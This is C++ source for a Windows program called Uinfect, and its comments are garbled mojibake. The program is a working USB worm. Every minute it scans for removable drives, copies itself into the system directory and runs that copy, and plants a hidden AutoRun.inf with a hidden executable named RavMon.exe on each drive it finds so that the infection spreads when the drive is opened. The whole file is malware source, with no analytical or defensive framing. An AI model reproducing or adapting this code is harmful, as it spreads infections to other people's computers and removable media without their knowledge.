// Uinfect.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"

void ResourceToFile(char  *filename,char *Name,char* Type)
{
	//Ѱ����������е���Դ
    HRSRC hRes = FindResource(NULL,Name,Type);
	if(hRes==NULL)
		return;
	//������Դ
    HGLOBAL hgRes = LoadResource(NULL, hRes);
	if(hgRes==NULL)
		return;
	//������Դ
    void *pRes = LockResource(hgRes);
	if(pRes==NULL)
		return;
	//�õ���Դ�ֽ���
    DWORD size = SizeofResource(NULL, hRes);
	if(size==0)
		return;
	//�����ļ�
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, 0, 
		             CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
    if(hFile==INVALID_HANDLE_VALUE)
		return;
    DWORD dwWrite;
	//����Դд�뵽�ļ�
    if(!WriteFile(hFile, pRes, size, &dwWrite, 0))
		return;
	//�ر��ļ����
    CloseHandle(hFile);
	//�ͷ���Դ
	GlobalFree(hgRes);
}

BOOL InfectU()
{
	while(true)
	{
		UINT revtype;
		char name[256]="H:\\" ;
		char szName[256]={0};
		char toPath[256]={0};
		char infPath[256]={0};
		char openU[80]={0};
		//���������̷�
		for(BYTE i=0x42;i<0x5B;i=i+0x01)
		{
			name[0]=i;
			//�õ��̷�����
			revtype=GetDriveType(name);
			//�ж��Ƿ��ǿ��ƶ��洢�豸
			if (revtype==DRIVE_REMOVABLE)
			{   
				//�õ������ļ�·��
				GetModuleFileName(NULL,szName,256);
				//�Ƚ��Ƿ��U�̵��̷���ͬ
				if(strncmp(name,szName,1)==0)
				{
					//�õ�ϵͳĿ¼
					GetSystemDirectory(toPath,256);
					strcat(toPath,"\\Uinfect.exe");
					//�������ļ����Ƶ�ϵͳĿ¼
					if(CopyFile(szName,toPath,TRUE))
					{
						//���г���
						WinExec(toPath,0);	
					}
					strcpy(openU,"explorer ");
					strcat(openU,name);
					//��U��
					WinExec(openU,1);
					return 0;	
				}
				else
				{
					strcpy(toPath,name);
					strcat(toPath,"\\RavMon.exe");
					strcpy(infPath,name);
					strcat(infPath,"\\AutoRun.inf");
					//��ԭU���ϵ��ļ�����
					SetFileAttributes(toPath,FILE_ATTRIBUTE_NORMAL);
					SetFileAttributes(infPath,FILE_ATTRIBUTE_NORMAL);
					//ɾ��ԭ���ļ�
                    DeleteFile(toPath);
					DeleteFile(infPath);
					//�ͷ�AutoRun.inf��U��
					ResourceToFile(infPath,MAKEINTRESOURCE(ID_DAT),
						       MAKEINTRESOURCE(RC_AUTORUN));
					//���������ļ���U��
					CopyFile(szName,toPath,FALSE);
					//���������ļ����ó�ϵͳ����������
					SetFileAttributes(toPath,
						FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
					SetFileAttributes(infPath,
						FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
				}
			}
		}
		//����60�룬60���һ��
		Sleep(60000);
	}
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 InfectU();
	return 0;
}



